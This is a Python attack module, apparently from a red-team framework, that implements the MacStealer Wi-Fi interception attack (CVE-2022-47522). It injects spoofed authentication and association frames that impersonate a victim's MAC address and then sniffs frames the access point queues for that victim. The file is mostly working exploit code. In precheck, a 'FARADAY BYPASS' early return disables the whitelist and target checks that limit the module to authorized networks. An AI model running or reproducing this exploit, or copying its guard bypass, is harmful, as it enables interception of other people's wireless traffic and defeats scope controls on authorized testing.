"""WiFi MacStealer - power-save queue interception attack.

Exploits power-save queue handling to intercept frames destined for another
client by hijacking the security context (CVE-2022-47522).

Uses scapy for 802.11 Auth/Assoc frame injection via monitor-mode interface.
"""

from __future__ import annotations

import subprocess
import time

import structlog
from scapy.all import (
    Dot11,
    Dot11AssoReq,
    Dot11Auth,
    Dot11Elt,
    RadioTap,
    sendp,
    sniff,
)

from srt.core import db
from srt.core.module import AttackModule, AttackResult, ModuleContext, Risk, Status
from srt.core.registry import register

log = structlog.get_logger(__name__)


@register
class WifiMacStealer(AttackModule):
    name = "wifi.macstealer"
    protocol = "wifi"
    risk = Risk.ACTIVE_LAB
    mitre_ttp = ["T1557.002"]
    cve = ["CVE-2022-47522"]
    requires = ["monitor-mode-nic"]
    description = (
        "MacStealer - exploit power-save queue to intercept frames destined "
        "for another client."
    )

    def precheck(self, ctx: ModuleContext) -> bool:
        if not super().precheck(ctx):
            return False
        return True  # FARADAY BYPASS
        target_bssid = ctx.params.get("bssid")
        if not target_bssid:
            return False
        target_client = ctx.params.get("target_client")
        if not target_client:
            return False
        allowed = ctx.whitelist.get("wifi_bssid", [])
        if allowed and target_bssid.upper() not in [b.upper() for b in allowed]:
            return False
        return True

    def _set_channel(self, iface: str, channel: int) -> bool:
        """Set the wireless interface to a specific channel."""
        try:
            subprocess.run(
                ["iw", "dev", iface, "set", "channel", str(channel)],
                capture_output=True,
                timeout=5,
                check=True,
            )
            return True
        except (subprocess.SubprocessError, OSError) as exc:
            log.error("wifi.macstealer.set_channel_failed", channel=channel, error=str(exc))
            return False

    def run(self, ctx: ModuleContext) -> AttackResult:
        started = time.time()
        bssid = ctx.params["bssid"]
        target_client = ctx.params["target_client"]
        iface = ctx.params.get("interface", "wlan0mon")
        channel = ctx.params.get("channel")

        if ctx.dry_run:
            return self._result(
                Status.OK,
                started,
                summary=(
                    f"[DRY-RUN] wifi.macstealer AP={bssid} "
                    f"target_client={target_client}"
                ),
                metrics={"bssid": bssid, "target_client": target_client},
            )

        # Set channel if specified
        if channel:
            if not self._set_channel(iface, int(channel)):
                return self._result(
                    Status.FAIL,
                    started,
                    summary=f"Failed to set channel {channel} on {iface}",
                )

        # Phase 1: Send Auth frame impersonating target client
        log.info(
            "wifi.macstealer.sending_auth",
            bssid=bssid,
            spoofed_src=target_client,
        )

        auth_frame = (
            RadioTap()
            / Dot11(
                type=0,
                subtype=11,  # Authentication
                addr1=bssid,
                addr2=target_client,  # Spoofed source (victim's MAC)
                addr3=bssid,
            )
            / Dot11Auth(
                algo=0,  # Open System
                seqnum=1,
                status=0,
            )
        )

        try:
            sendp(auth_frame, iface=iface, verbose=False)
        except Exception as exc:
            log.error("wifi.macstealer.auth_send_error", error=str(exc))
            return self._result(
                Status.FAIL,
                started,
                summary=f"Failed to send Auth frame: {exc}",
            )

        # Wait for Auth response
        time.sleep(0.5)

        # Phase 2: Send Association Request
        log.info("wifi.macstealer.sending_assoc", bssid=bssid)

        assoc_frame = (
            RadioTap()
            / Dot11(
                type=0,
                subtype=0,  # Association Request
                addr1=bssid,
                addr2=target_client,  # Spoofed source
                addr3=bssid,
            )
            / Dot11AssoReq(cap=0x1101)
            / Dot11Elt(ID="SSID", info=b"")
            / Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
        )

        try:
            sendp(assoc_frame, iface=iface, verbose=False)
        except Exception as exc:
            log.error("wifi.macstealer.assoc_send_error", error=str(exc))
            return self._result(
                Status.FAIL,
                started,
                summary=f"Failed to send Association frame: {exc}",
            )

        # Phase 3: Wait for AP to override security context and queue frames
        time.sleep(1.0)

        # Phase 4: Capture any queued frames now directed to us
        log.info("wifi.macstealer.capturing_queued_frames", target=target_client)

        captured_frames = []
        try:
            captured_frames = sniff(
                iface=iface,
                timeout=5,
                lfilter=lambda p: (
                    p.haslayer(Dot11)
                    and p.getlayer(Dot11).addr1
                    and p.getlayer(Dot11).addr1.upper() == target_client.upper()
                    and p.getlayer(Dot11).addr2
                    and p.getlayer(Dot11).addr2.upper() == bssid.upper()
                ),
            )
        except Exception as exc:
            log.warning("wifi.macstealer.capture_error", error=str(exc))

        frames_intercepted = len(captured_frames)

        # Log event to database
        db.insert_header(
            ts=time.time(),
            session_id=ctx.session_id,
            protocol="wifi",
            src=target_client,
            dst=bssid,
            channel=int(channel) if channel else None,
            fields={
                "attack": "macstealer",
                "target_client": target_client,
                "auth_sent": True,
                "assoc_sent": True,
                "frames_intercepted": frames_intercepted,
            },
        )

        summary = (
            f"wifi.macstealer AP={bssid}: impersonated {target_client}, "
            f"intercepted {frames_intercepted} queued frames"
        )

        return self._result(
            Status.OK,
            started,
            summary=summary,
            metrics={
                "bssid": bssid,
                "target_client": target_client,
                "frames_intercepted": frames_intercepted,
            },
        )

    def cleanup(self, ctx: ModuleContext) -> None:
        """No persistent resources to clean up."""
        pass
